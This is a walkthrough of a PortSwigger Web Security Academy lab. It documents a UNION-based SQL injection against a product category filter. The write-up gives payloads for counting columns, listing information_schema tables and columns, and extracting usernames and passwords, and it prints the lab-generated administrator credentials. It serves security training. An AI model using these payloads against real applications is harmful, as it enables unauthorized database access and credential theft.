# Lab Walkthrough Evidence
## SQL Injection Attack – Listing Database Contents (Non Oracle)
Date: 24th of August, 2025
Lab Source  
PortSwigger Web Security Academy

Lab Title  
SQL Injection attack, listing the database contents on non Oracle databases

Lab Status  
Solved

---

# Lab Description

This lab contains a SQL injection vulnerability in the **product category filter** of the web application.

The results of the database query are returned in the application's response. Because of this behavior, it is possible to perform a **UNION based SQL injection attack** to retrieve information from other tables in the database.

The application also contains a login function and the database stores usernames and passwords in a separate table.

The goal of the attack is to:

• Determine the name of the table storing user credentials  
• Identify the columns inside that table  
• Extract usernames and passwords from the database  
• Log in as the administrator user

---

# Step 1 – Identify the Injection Point

The product category filter was tested by inserting the following character into the request:
![web Lab](web-application-security/sql-injection-lab/screenshots/2.png)
```
'
```

The application generated an error, confirming that the input was not properly sanitized and was vulnerable to SQL injection.

The request was then captured using **Burp Suite** and sent to:

• Repeater  
• Intruder  

This allowed controlled testing of SQL payloads.
![Capture Burp Suite](web-application-security/sql-injection-lab/screenshots/3.png)

---

# Step 2 – Determine Number of Columns

The number of columns in the SQL query was identified using UNION SELECT statements.

Payloads tested:

```
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --
```

The application responded successfully when **two NULL values** were used.

This confirmed that the query contained **two columns**.
![Number of column](web-application-security/sql-injection-lab/screenshots/4.png)

---

# Step 3 – Determine String Compatible Column

Next, tests were performed to determine which column could display string values.

Payloads used:

```
' UNION SELECT 'abc', NULL --
' UNION SELECT NULL, 'def' --
```

One of the columns successfully displayed text output, confirming it was compatible with string data.
![String-compatible Column](web-application-security/sql-injection-lab/screenshots/5.png)

---

# Step 4 – Enumerate Database Tables

Since the database is **non Oracle (MySQL/PostgreSQL)**, table metadata can be retrieved from the `information_schema` database.

Payload used:

```
' UNION SELECT table_name, NULL FROM information_schema.tables --
```

This returned a list of tables stored in the database.
![ls DB](web-application-security/sql-injection-lab/screenshots/6.png)

---

# Step 5 – Identify Columns in the Users Table

After identifying the table containing user credentials, the next step was to list its columns.

Payload used:

```
' UNION SELECT column_name, NULL
FROM information_schema.columns
WHERE table_name='users_bbdpko' --
```

This revealed the column names stored in the table.

Discovered columns:

```
username_ivkjlv
password_mwxzap
```
![ls Column <target>table](web-application-security/sql-injection-lab/screenshots/7.png)

---

# Step 6 – Extract Username and Password Data

After identifying the column names, the following payload was used to extract user credentials.

```
'+UNION+SELECT+username_ivkjlv,+password_mwxzap+FROM+users_bbdpko--
```

---

# Extracted Credentials

```
administrator : clusmhm3jz7vet25l45r
carlos : ist7eek74cmytlid84oe
```
![Ls passwd & username](web-application-security/sql-injection-lab/screenshots/8.png)

---

# Result

The SQL injection attack successfully:

• Enumerated database tables  
• Identified credential storage table  
• Extracted usernames and passwords from the database

This allowed the attacker to log in as the **administrator user**, successfully completing the lab.
![Sucessfull](web-application-security/sql-injection-lab/screenshots/9.png)

---

# Evidence

Add screenshots here:

• Burp Suite intercepted request  
• UNION column discovery  
• Table enumeration  
• Column enumeration  
• Credential extraction
